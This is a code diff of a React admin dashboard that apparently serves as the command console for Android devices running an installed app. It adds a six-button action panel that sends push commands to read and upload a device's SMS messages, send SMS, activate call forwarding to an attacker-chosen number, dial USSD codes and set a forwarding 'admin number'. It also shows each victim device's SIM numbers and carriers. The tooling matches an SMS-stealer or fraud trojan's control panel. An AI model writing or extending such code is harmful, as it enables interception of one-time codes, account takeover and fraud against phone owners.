@@ -970,54 +970,200 @@ function GroupsTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
 }
 
 /* ══════════════════════════════════════════
-   DEVICE DETAIL + FCM ACTIONS
+   DEVICE DETAIL + FCM ACTIONS  (sub-admin style)
 ══════════════════════════════════════════ */
 type FcmState = "idle" | "sending" | "ok" | "err";
-function FcmActionCard({ title, icon, children, onReset }: { title: string; icon: React.ReactNode; children: React.ReactNode; onReset: () => void }) {
+type ActionKey = "online_check" | "get_sms" | "send_sms" | "update_number" | "call_forward" | "dial_ussd";
+
+const ACTION_LABELS: { key: ActionKey; label: string }[] = [
+  { key: "online_check", label: "Online Check" },
+  { key: "get_sms",      label: "Get SMS"      },
+  { key: "send_sms",     label: "Send SMS"     },
+  { key: "update_number",label: "Update"       },
+  { key: "call_forward", label: "Call Forward" },
+  { key: "dial_ussd",    label: "Dial USSD"   },
+];
+
+function InfoRow({ label, value, accent, mono, children }: { label: string; value?: string; accent?: string; mono?: boolean; children?: React.ReactNode }) {
   return (
-    <div style={{ background: T.inputBg, borderRadius: 12, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
-      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: 8 }}>
-        <div style={{ color: T.accentLight }}>{icon}</div>
-        <div style={{ fontSize: 13, fontWeight: 800, color: T.text, flex: 1 }}>{title}</div>
-        <button onClick={onReset} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 10, padding: "2px 6px" }}>Reset</button>
+    <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8 }}>
+      <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>{label}</div>
+      {children ?? <div style={{ flex: 1, fontSize: 12, color: accent ?? T.mutedLight, fontFamily: mono ? "monospace" : "inherit", wordBreak: "break-all" }}>{value}</div>}
+    </div>
+  );
+}
+
+function DeviceActionPanel({ action, device, masterPin, onClose }: { action: ActionKey; device: FullDevice; masterPin: string; onClose: () => void }) {
+  const [sim, setSim] = useState<"1" | "2">("1");
+  const [number, setNumber] = useState("");
+  const [smsText, setSmsText] = useState("");
+  const [ussdCode, setUssdCode] = useState("");
+  const [smsCount, setSmsCount] = useState("20");
+  const [adminEnabled, setAdminEnabled] = useState(true);
+  const [state, setState] = useState<FcmState>("idle");
+  const [log, setLog] = useState("");
+  const [disableState, setDisableState] = useState<FcmState>("idle");
+
+  async function fcm(data: Record<string, string>) {
+    if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
+    setState("sending"); setLog("Sending…");
+    try {
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
+      if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
+      setLog("Sent! Waiting for device…"); setState("ok");
+      setTimeout(() => { setState("idle"); setLog(""); }, 6000);
+    } catch { setLog("Network error"); setState("err"); }
+  }
+
+  const titles: Record<ActionKey, string> = {
+    online_check: "Online Check", get_sms: "Get SMS", send_sms: "Send SMS",
+    update_number: "Update Admin Number", call_forward: "Call Forwarding", dial_ussd: "Dial USSD",
+  };
+
+  const inp: React.CSSProperties = { width: "100%", boxSizing: "border-box", background: T.inputBg, border: `1.5px solid ${T.borderLight}`, borderRadius: 8, padding: "10px 12px", fontSize: 13, outline: "none", color: T.text, marginBottom: 10 };
+
+  function PrimaryBtn({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
+    return (
+      <button onClick={onClick} disabled={disabled} style={{ width: "100%", padding: "11px 0", borderRadius: 9, border: "none", background: state === "ok" ? T.green : T.accent, color: "#fff", fontWeight: 700, fontSize: 14, cursor: disabled ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+        {children}
+      </button>
+    );
+  }
+
+  const StatusLog = () => log ? (
+    <div style={{ fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 10, background: state === "ok" ? T.green + "18" : state === "err" ? T.red + "15" : T.accentGlow, color: state === "ok" ? T.green : state === "err" ? T.red : T.accentLight }}>{log}</div>
+  ) : null;
+
+  function SimSel() {
+    return (
+      <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
+        {(["1", "2"] as const).map(s => {
+          const carrier = s === "1" ? device.sim1Carrier : device.sim2Carrier;
+          const phone = s === "1" ? device.sim1Phone : device.sim2Phone;
+          const active = sim === s;
+          return (
+            <button key={s} onClick={() => setSim(s)} style={{ flex: 1, padding: "7px 8px", borderRadius: 8, border: `1.5px solid ${active ? T.accent : T.borderLight}`, background: active ? T.accentGlow : T.card, cursor: "pointer", textAlign: "left" }}>
+              <div style={{ fontSize: 10, fontWeight: 700, color: active ? T.accentLight : T.muted }}>SIM {s}</div>
+              <div style={{ fontSize: 9, color: active ? T.accentLight : T.muted, marginTop: 1 }}>{[carrier, phone].filter(Boolean).join(" · ") || "No SIM"}</div>
+            </button>
+          );
+        })}
       </div>
-      <div style={{ padding: 14 }}>{children}</div>
+    );
+  }
+
+  return (
+    <div style={{ background: T.card, borderRadius: 12, border: `1.5px solid ${T.accent}44`, padding: 14 }}>
+      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12 }}>
+        <div style={{ fontWeight: 700, fontSize: 14, color: T.text }}>{titles[action]}</div>
+        <button onClick={onClose} style={{ background: "none", border: "none", color: T.muted, fontSize: 18, cursor: "pointer", padding: 0, lineHeight: 1 }}>✕</button>
+      </div>
+
+      {action === "online_check" && (
+        <>
+          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 12 }}>Pings <b style={{ color: T.text }}>{device.name}</b> to check if it's online.</div>
+          <StatusLog />
+          <PrimaryBtn onClick={() => fcm({ type: "online_check" })} disabled={state === "sending"}>
+            {state === "sending" ? <><Spinner /> Waiting…</> : state === "ok" ? "✓ Online" : "Ping Device"}
+          </PrimaryBtn>
+        </>
+      )}
+
+      {action === "get_sms" && (
+        <>
+          <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 10 }}>Device will upload its latest messages.</div>
+          <input type="text" placeholder="Phone filter (optional)" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
+          <input type="number" placeholder="Max count (default 20)" value={smsCount} onChange={e => setSmsCount(e.target.value)} style={inp} />
+          <StatusLog />
+          <PrimaryBtn onClick={() => fcm({ type: "get_sms", count: smsCount || "20", ...(number.trim() ? { phoneNumber: number.trim() } : {}), simSlot: sim === "2" ? "1" : "0" })} disabled={state === "sending"}>
+            {state === "sending" ? <><Spinner /> Requesting…</> : "Get SMS"}
+          </PrimaryBtn>
+        </>
+      )}
+
+      {action === "send_sms" && (
+        <>
+          <SimSel />
+          <input type="tel" placeholder="Recipient number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
+          <textarea placeholder="Message text…" value={smsText} onChange={e => setSmsText(e.target.value)} rows={3} style={{ ...inp, resize: "vertical", fontFamily: "inherit" }} />
+          <StatusLog />
+          <PrimaryBtn onClick={() => {
+            if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
+            if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
+            void fcm({ type: "sms", to: number.trim(), body: smsText.trim(), simSlot: sim === "2" ? "1" : "0" });
+          }} disabled={state === "sending"}>
+            {state === "sending" ? <><Spinner /> Sending…</> : "Send SMS"}
+          </PrimaryBtn>
+        </>
+      )}
+
+      {action === "update_number" && (
+        <>
+          <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
+            <button onClick={() => setAdminEnabled(true)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${adminEnabled ? T.green + "55" : T.borderLight}`, background: adminEnabled ? T.green + "18" : T.card, color: adminEnabled ? T.green : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Enable</button>
+            <button onClick={() => setAdminEnabled(false)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${!adminEnabled ? T.red + "55" : T.borderLight}`, background: !adminEnabled ? T.red + "18" : T.card, color: !adminEnabled ? T.red : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Disable</button>
+          </div>
+          {adminEnabled && <input type="tel" placeholder="Admin phone number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />}
+          <StatusLog />
+          <PrimaryBtn onClick={() => fcm(adminEnabled ? { type: "admin_update", status: "on", adminNumber: number.trim(), deviceId: device.deviceId, simSlot: sim === "2" ? "1" : "0" } : { type: "admin_update", status: "off", deviceId: device.deviceId })} disabled={state === "sending" || (adminEnabled && !number.trim())}>
+            {state === "sending" ? <><Spinner /> Updating…</> : "Update Number"}
+          </PrimaryBtn>
+          <button onClick={() => {
+            setDisableState("sending");
+            apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "admin_update", status: "off", deviceId: device.deviceId } }) })
+              .then(() => { setDisableState("ok"); setTimeout(() => setDisableState("idle"), 3000); })
+              .catch(() => setDisableState("idle"));
+          }} disabled={disableState === "sending"} style={{ width: "100%", marginTop: 8, padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444", background: disableState === "ok" ? T.green : "transparent", color: disableState === "ok" ? "#fff" : "#ef4444", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
+            {disableState === "sending" ? "Disabling…" : disableState === "ok" ? "Disabled ✓" : "Disable Forwarding"}
+          </button>
+        </>
+      )}
+
+      {action === "call_forward" && (
+        <>
+          <SimSel />
+          <input type="tel" placeholder="Forward to number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
+          <StatusLog />
+          <div style={{ display: "flex", gap: 10 }}>
+            <button onClick={() => {
+              if (!number.trim()) { setLog("Enter a number to forward calls to."); setState("err"); return; }
+              void fcm({ type: "call_forward", action: "activate", number: number.trim(), sim: sim === "2" ? "1" : "0" });
+            }} disabled={state === "sending"} style={{ flex: 1, padding: "11px 0", borderRadius: 9, border: "none", background: T.green, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
+              {state === "sending" ? "Activating…" : "Activate"}
+            </button>
+            <button onClick={() => fcm({ type: "call_forward", action: "deactivate", number: "", sim: sim === "2" ? "1" : "0" })} disabled={state === "sending"} style={{ flex: 1, padding: "11px 0", borderRadius: 9, border: "none", background: "#ef4444", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
+              {state === "sending" ? "Deactivating…" : "Deactivate"}
+            </button>
+          </div>
+          <div style={{ fontSize: 10, color: T.muted, textAlign: "center", marginTop: 6 }}>Deactivate dials <span style={{ fontFamily: "monospace", color: "#f87171" }}>##21#</span> automatically</div>
+        </>
+      )}
+
+      {action === "dial_ussd" && (
+        <>
+          <SimSel />
+          <input type="text" placeholder="USSD code (e.g. *123#)" value={ussdCode} onChange={e => setUssdCode(e.target.value)} style={{ ...inp, fontFamily: "monospace" }} />
+          <StatusLog />
+          <PrimaryBtn onClick={() => {
+            if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
+            void fcm({ type: "ussd", code: ussdCode.trim(), simSlot: sim === "2" ? "1" : "0" });
+          }} disabled={state === "sending"}>
+            {state === "sending" ? <><Spinner /> Dialing…</> : "Dial USSD"}
+          </PrimaryBtn>
+        </>
+      )}
     </div>
   );
 }
 
 function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; masterPin: string; onClose: () => void }) {
-  const [sim, setSim] = useState<"1" | "2">("1");
-
-  const [pingState, setPingState] = useState<FcmState>("idle");
-  const [pingLog, setPingLog] = useState("");
-
-  const [smsGetState, setSmsGetState] = useState<FcmState>("idle");
-  const [smsGetLog, setSmsGetLog] = useState("");
-  const [smsGetPhone, setSmsGetPhone] = useState("");
-  const [smsGetCount, setSmsGetCount] = useState("20");
-
-  const [smsSendState, setSmsSendState] = useState<FcmState>("idle");
-  const [smsSendLog, setSmsSendLog] = useState("");
-  const [smsSendTo, setSmsSendTo] = useState("");
-  const [smsSendBody, setSmsSendBody] = useState("");
-
-  const [adminState, setAdminState] = useState<FcmState>("idle");
-  const [adminLog, setAdminLog] = useState("");
-  const [adminNumber, setAdminNumber] = useState("");
-  const [adminEnabled, setAdminEnabled] = useState(device.forwardEnabled);
-
-  const [fwdState, setFwdState] = useState<FcmState>("idle");
-  const [fwdLog, setFwdLog] = useState("");
-  const [fwdNumber, setFwdNumber] = useState("");
-
-  const [ussdState, setUssdState] = useState<FcmState>("idle");
-  const [ussdLog, setUssdLog] = useState("");
-  const [ussdCode, setUssdCode] = useState("");
-
+  const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
   const [devMsgs, setDevMsgs] = useState<MsgRow[]>([]);
   const [msgsLoading, setMsgsLoading] = useState(false);
   const [msgSearch, setMsgSearch] = useState("");
+
+  const ONLINE_MS = 15 * 60 * 1000;
+  const isRecent = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;
 
   function loadDevMsgs() {
     setMsgsLoading(true);
@@ -1033,209 +1179,125 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
   const filteredDevMsgs = useMemo(() => {
     const q = msgSearch.trim().toLowerCase();
     if (!q) return devMsgs;
-    return devMsgs.filter(m =>
-      m.body.toLowerCase().includes(q) ||
-      m.fromSender.toLowerCase().includes(q) ||
-      m.fromNumber.includes(q)
-    );
+    return devMsgs.filter(m => m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q));
   }, [devMsgs, msgSearch]);
 
-  async function sendFcm(data: Record<string, string>, setState: (s: FcmState) => void, setLog: (l: string) => void) {
-    if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
-    setState("sending"); setLog("Sending…");
-    try {
-      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
-      if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
-      setLog("Sent! Waiting for device…"); setState("ok");
-      setTimeout(() => { setState("idle"); setLog(""); }, 6000);
-    } catch { setLog("Network error"); setState("err"); }
-  }
-
-  const stateStyle = (s: FcmState): React.CSSProperties => ({
-    fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
-    background: s === "ok" ? T.green + "18" : s === "err" ? T.red + "15" : T.accentGlow,
-    color: s === "ok" ? T.green : s === "err" ? T.red : T.accentLight,
-    display: s === "idle" ? "none" : "block",
-  });
-
-  function BtnSend({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
-    return (
-      <button onClick={onClick} disabled={disabled} style={{ width: "100%", padding: "10px 0", borderRadius: 9, background: disabled ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, color: disabled ? T.accentLight : "#fff", border: "none", fontWeight: 800, fontSize: 13, cursor: disabled ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-        {children}
-      </button>
-    );
-  }
-
-  const ONLINE_MS = 15 * 60 * 1000;
-  const isOnline = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;
-
-  function renderSim(slot: number, carrier: string | null, phone: string | null) {
-    return (
-      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px" }}>SIM{slot}</span>
-        {carrier || phone ? <span style={{ fontSize: 12, color: T.mutedLight }}>{carrier && <b style={{ color: T.text }}>{carrier}</b>}{carrier && phone && " · "}{phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}</span> : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>}
-      </div>
-    );
-  }
+  const sim1 = [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(": ") || "—";
+  const sim2 = [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(": ") || "—";
 
   return (
-    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.90)", zIndex: 300, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
-      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, padding: "0 16px", flexShrink: 0 }}>
-        <div style={{ maxWidth: 720, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
-          <button onClick={onClose} style={{ background: T.border, border: "none", color: T.text, borderRadius: 8, width: 34, height: 34, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}><Ic.X /></button>
-          <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
-            <div style={{ color: T.accentLight }}><Ic.Smartphone /></div>
-            <span style={{ fontWeight: 900, fontSize: 15, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.name}</span>
-            <span style={{ display: "inline-flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800 }}>
-              <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
-            </span>
-          </div>
-          <span style={{ fontSize: 10, color: T.muted, fontFamily: "monospace" }}>{device.appId}</span>
-        </div>
-      </div>
-      <div style={{ flex: 1, overflowY: "auto", padding: 16, background: T.bg }}>
-        <div style={{ maxWidth: 720, margin: "0 auto", display: "flex", flexDirection: "column", gap: 12 }}>
-          {/* Device Info Card */}
-          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
-            <div style={{ display: "flex", flexWrap: "wrap", gap: 12 }}>
-              <div style={{ flex: 1, minWidth: 200 }}>
-                <div style={{ fontWeight: 800, fontSize: 16, color: T.text, marginBottom: 10 }}>{device.name}</div>
-                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-                  {renderSim(1, device.sim1Carrier, device.sim1Phone)}
-                  {renderSim(2, device.sim2Carrier, device.sim2Phone)}
-                </div>
-              </div>
-              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
-                {[
-                  { l: "Device ID", v: device.deviceId },
-                  { l: "User ID", v: device.userId },
-                  { l: "App ID", v: device.appId },
-                  { l: "Android", v: device.androidVersion > 0 ? `v${device.androidVersion}` : "—" },
-                  { l: "FCM", v: device.hasFcm ? "Active" : "None" },
-                  { l: "Forward", v: device.forwardEnabled ? `SIM${device.forwardSlot ?? "?"} ON` : "Off" },
-                  { l: "Last Online", v: fmtAgo(device.lastOnline) },
-                  { l: "Installed", v: fmtAgo(device.installedAt) },
-                ].map(({ l, v }) => (
-                  <div key={l} style={{ display: "flex", gap: 8, fontSize: 11 }}>
-                    <span style={{ color: T.muted, fontWeight: 600, minWidth: 80 }}>{l}</span>
-                    <span style={{ color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all" }}>{v}</span>
-                  </div>
-                ))}
+    <div style={{ position: "fixed", inset: 0, background: "rgba(4,8,20,0.96)", zIndex: 300, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
+      <div style={{ flex: 1, overflowY: "auto", padding: "12px 12px 32px", background: T.bg }}>
+        <div style={{ maxWidth: 680, margin: "0 auto", display: "flex", flexDirection: "column", gap: 10 }}>
+
+          {/* ── Name banner ── */}
+          <div style={{ background: T.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
+            <div style={{ flex: 1, minWidth: 0 }}>
+              <div style={{ fontWeight: 700, fontSize: 15, color: T.text }}>{device.name}</div>
+              <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 2 }}>
+                <div style={{ fontSize: 9, color: T.muted, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.deviceId}</div>
+                <CopyIconBtn value={device.deviceId} title="Copy Device ID" />
               </div>
             </div>
-            <div style={{ display: "flex", gap: 6, marginTop: 12, flexWrap: "wrap" }}>
-              <CopyBtn value={device.deviceId} label="Device ID" />
-              <CopyBtn value={device.userId} label="User ID" />
-              {device.sim1Phone && <CopyBtn value={device.sim1Phone} label="SIM1" />}
-              {device.sim2Phone && <CopyBtn value={device.sim2Phone} label="SIM2" />}
+            <div style={{ fontSize: 11, textAlign: "right", flexShrink: 0 }}>
+              <div style={{ fontSize: 9, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
+              <div style={{ fontWeight: 700, color: isRecent ? T.green : T.muted }}>{fmtAgo(device.lastOnline)}</div>
             </div>
           </div>
 
+          {/* ── Info rows ── */}
+          <div style={{ background: T.card, borderRadius: 10, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
+            {/* Name row + Back button */}
+            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8 }}>
+              <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
+              <div style={{ flex: 1, fontSize: 12, color: T.mutedLight }}>{device.name}</div>
+              <button onClick={onClose} style={{ flexShrink: 0, background: T.accent, border: `1.5px solid #6366f1`, borderRadius: 8, padding: "7px 14px", fontSize: 13, fontWeight: 800, color: "#fff", cursor: "pointer", boxShadow: "0 2px 10px rgba(99,102,241,0.5)", letterSpacing: 0.3 }}>← Back</button>
+            </div>
+
+            <InfoRow label="Device ID" value={device.deviceId} accent={T.green} mono />
+            <InfoRow label="Android" value={device.androidVersion > 0 ? `v${device.androidVersion}` : "—"} />
+            <InfoRow label="App ID" value={device.appId} mono />
+            <InfoRow label="User ID" value={device.userId} mono />
+            <InfoRow label="SIM 1" value={sim1} />
+            <InfoRow label="SIM 2" value={sim2} />
+
+            {/* Call Forward row */}
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "9px 14px", borderBottom: `1px solid ${T.border}` }}>
+              <span style={{ fontSize: 11, color: T.muted, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>Call Forward</span>
+              <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                <span style={{ display: "inline-flex", alignItems: "center", gap: 5, background: device.forwardEnabled ? "#14532d" : "#450a0a", border: `1px solid ${device.forwardEnabled ? T.green : "#ef4444"}`, borderRadius: 20, padding: "3px 11px", fontSize: 12, fontWeight: 700, color: device.forwardEnabled ? "#4ade80" : "#f87171" }}>
+                  <span style={{ width: 7, height: 7, borderRadius: "50%", background: device.forwardEnabled ? T.green : "#ef4444", boxShadow: device.forwardEnabled ? `0 0 6px ${T.green}` : "none", display: "inline-block", flexShrink: 0 }} />
+                  {device.forwardEnabled ? "ON" : "OFF"}
+                </span>
+                {device.forwardEnabled && device.forwardSlot !== null && device.forwardSlot !== undefined && (
+                  <span style={{ display: "inline-flex", alignItems: "center", gap: 4, background: "#0f2744", border: "1px solid #2563eb", borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: "#93c5fd" }}>
+                    SIM {(device.forwardSlot as number) + 1}
+                  </span>
+                )}
+              </div>
+            </div>
+
+            <InfoRow label="FCM" value={device.hasFcm ? "✓ Active" : "None"} accent={device.hasFcm ? T.green : T.muted} />
+            <InfoRow label="Installed" value={fmtDate(device.installedAt)} accent={T.green} />
+
+            {/* Last Seen + Newest first badge */}
+            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", gap: 8 }}>
+              <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
+              <div style={{ flex: 1, fontSize: 12, color: isRecent ? T.green : T.mutedLight }}>{fmtAgo(device.lastOnline)}</div>
+              <span style={{ fontSize: 10, color: T.muted, background: T.border, borderRadius: 6, padding: "3px 8px" }}>Newest first</span>
+            </div>
+          </div>
+
+          {/* ── No FCM warning ── */}
           {!device.hasFcm && (
             <div style={{ background: T.yellow + "14", border: `1px solid ${T.yellow}40`, borderRadius: 10, padding: "10px 14px", fontSize: 12, color: T.yellow, display: "flex", alignItems: "center", gap: 8 }}>
               <Ic.Alert /> No FCM token — FCM actions will not work on this device.
             </div>
           )}
 
-          {/* SIM Selector */}
-          <div style={{ display: "flex", gap: 8 }}>
-            {(["1", "2"] as const).map(s => {
-              const active = sim === s;
-              const carrier = s === "1" ? device.sim1Carrier : device.sim2Carrier;
-              const phone = s === "1" ? device.sim1Phone : device.sim2Phone;
+          {/* ── Action buttons 3×2 grid ── */}
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
+            {ACTION_LABELS.map(({ key, label }) => {
+              const isActive = activeAction === key;
               return (
-                <button key={s} onClick={() => setSim(s)} style={{ flex: 1, padding: "8px 12px", borderRadius: 9, border: `1.5px solid ${active ? T.accent : T.borderLight}`, background: active ? T.accentGlow : T.card, cursor: "pointer", textAlign: "left", transition: "all 0.15s" }}>
-                  <div style={{ fontSize: 11, fontWeight: 700, color: active ? T.accentLight : T.muted }}>SIM {s}</div>
-                  <div style={{ fontSize: 10, color: active ? T.accentLight : T.muted, marginTop: 2 }}>{[carrier, phone].filter(Boolean).join(" · ") || "No SIM"}</div>
+                <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
+                  background: isActive ? T.accentGlow : T.card,
+                  border: "1.5px solid",
+                  borderColor: isActive ? T.accent : T.borderLight,
+                  borderRadius: 9, padding: "11px 4px", cursor: "pointer",
+                  fontSize: 11, fontWeight: isActive ? 700 : 500,
+                  color: isActive ? T.accentLight : T.mutedLight,
+                  textAlign: "center", transition: "all 0.15s",
+                }}>
+                  {label}
                 </button>
               );
             })}
           </div>
 
-          {/* FCM Action 1: Online Check */}
-          <FcmActionCard title="Online Check (Ping)" icon={<Ic.Wifi />} onReset={() => { setPingState("idle"); setPingLog(""); }}>
-            <div style={stateStyle(pingState)}>{pingLog}</div>
-            <BtnSend onClick={() => sendFcm({ type: "online_check" }, setPingState, setPingLog)} disabled={pingState === "sending"}>
-              {pingState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Wifi /> Send Ping</>}
-            </BtnSend>
-          </FcmActionCard>
+          {/* ── Active action panel ── */}
+          {activeAction && (
+            <DeviceActionPanel
+              key={activeAction}
+              action={activeAction}
+              device={device}
+              masterPin={masterPin}
+              onClose={() => setActiveAction(null)}
+            />
+          )}
 
-          {/* FCM Action 2: Get SMS */}
-          <FcmActionCard title="Get SMS" icon={<Ic.MessageSquare />} onReset={() => { setSmsGetState("idle"); setSmsGetLog(""); setSmsGetPhone(""); setSmsGetCount("20"); }}>
-            <input type="text" placeholder="Phone number filter (optional)" value={smsGetPhone} onChange={e => setSmsGetPhone(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
-            <input type="number" placeholder="Max count (default 20)" value={smsGetCount} onChange={e => setSmsGetCount(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
-            <div style={stateStyle(smsGetState)}>{smsGetLog}</div>
-            <BtnSend onClick={() => sendFcm({ type: "get_sms", count: smsGetCount || "20", ...(smsGetPhone ? { phoneNumber: smsGetPhone } : {}), simSlot: sim === "2" ? "1" : "0" }, setSmsGetState, setSmsGetLog)} disabled={smsGetState === "sending"}>
-              {smsGetState === "sending" ? <><Spinner /> Sending…</> : <><Ic.MessageSquare /> Get SMS</>}
-            </BtnSend>
-          </FcmActionCard>
-
-          {/* FCM Action 3: Send SMS */}
-          <FcmActionCard title="Send SMS" icon={<Ic.Send />} onReset={() => { setSmsSendState("idle"); setSmsSendLog(""); setSmsSendTo(""); setSmsSendBody(""); }}>
-            <input type="tel" placeholder="To (phone number)" value={smsSendTo} onChange={e => setSmsSendTo(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
-            <textarea placeholder="Message body" value={smsSendBody} onChange={e => setSmsSendBody(e.target.value)} rows={3} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, resize: "vertical" }} />
-            <div style={stateStyle(smsSendState)}>{smsSendLog}</div>
-            <BtnSend onClick={() => { if (!smsSendTo.trim() || !smsSendBody.trim()) return; sendFcm({ type: "sms", to: smsSendTo.trim(), body: smsSendBody.trim(), simSlot: sim === "2" ? "1" : "0" }, setSmsSendState, setSmsSendLog); }} disabled={smsSendState === "sending" || !smsSendTo.trim() || !smsSendBody.trim()}>
-              {smsSendState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Send /> Send SMS</>}
-            </BtnSend>
-          </FcmActionCard>
-
-          {/* FCM Action 4: Update Admin Number */}
-          <FcmActionCard title="Update Admin Number" icon={<Ic.Key />} onReset={() => { setAdminState("idle"); setAdminLog(""); setAdminNumber(""); setAdminEnabled(device.forwardEnabled); }}>
-            <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
-              <button onClick={() => setAdminEnabled(true)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${adminEnabled ? T.green + "55" : T.borderLight}`, background: adminEnabled ? T.green + "18" : T.card, color: adminEnabled ? T.green : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Enable</button>
